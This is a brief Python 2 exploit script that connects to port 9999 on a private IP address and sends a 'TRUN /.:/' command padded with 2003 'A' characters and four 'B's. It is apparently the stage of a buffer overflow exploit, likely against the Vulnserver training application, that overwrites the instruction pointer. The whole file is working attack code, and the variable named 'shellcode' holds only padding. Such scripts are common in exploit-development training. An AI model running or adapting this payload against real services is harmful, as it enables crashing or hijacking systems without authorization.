#!/usr/bin/python
import sys, socket

shellcode = "A" * 2003 + "B" * 4
port = 9999
targetip = '192.168.1.136'
try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((targetip, port))
	s.send(('TRUN /.:/' + shellcode))
	s.close()

except:
	print "Error connecting to server"
	sys.exit()


